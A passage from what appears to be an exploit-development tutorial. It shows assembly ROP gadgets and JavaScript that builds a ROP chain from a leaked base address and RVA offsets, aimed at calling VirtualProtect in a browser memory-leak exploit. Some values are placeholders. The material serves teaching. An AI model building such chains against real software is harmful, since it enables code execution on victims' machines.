```
xor eax, eax  # Zero out EAX
retn

add eax, 1c   # Rerun this as many times as needed to reach 0x201
retn          # There are likely other values besides 0x1c

inc eax       # If necessary to increment by 1
retn

push eax      # Push the value destined for EBX onto the stack
retn

pop ebx       # Get the value into EBX
retn
```

There are likely many ways to accomplish that goal. In this example, you would need to reorder the gadgets because EAX needs to dereference the IAT entry for VirtualProtect and then exchange it with ESI, as shown in the first portion of the ROP chain. For now, we’ll just take the ROP chain with the unresolved gadget and add it to our memory leak HTML file to demonstrate the point. The following script is partially unnecessary; however, it has been created as such so that you can visually see how the RVA offsets are added to the recovered base address. Here is part of the updated Final_leaked.html file:

```
function getRopChain() {

b = document.createElement("form");
b.style.fontFamily = "Courier New";
document.body.appendChild(b);
var g1 = base_address + 0x5fd02;
var g2 = base_address + 0xeb0d4;
var g3 = base_address + 0xd89b;
var g4 = base_address + 0x75126;
var g5 = base_address + 0x6aa98;
var g6 = base_address + 0x3ecd1;
var g7 = 0x00000000;
var g8 = base_address + 0xc5942;
var g9 = 0xa03c7540;
var g10 = base_address + 0x2b801;
var g11 = 0x41414141;
var g12 = 0x41414141;
var g13 = base_address + 0x3da04;
var g14 = 0x41414141;
var g15 = 0x41414141;
var g16 = base_address + 0x4b1aa;
var g17 = base_address + 0xe273d;
var g18 = base_address + 0x5ff35;
var g19 = base_address + 0x49dc2;
var g20 = base_address + 0xc5946;
var g21 = 0x90909090;
var g22 = base_address + 0x6173;
```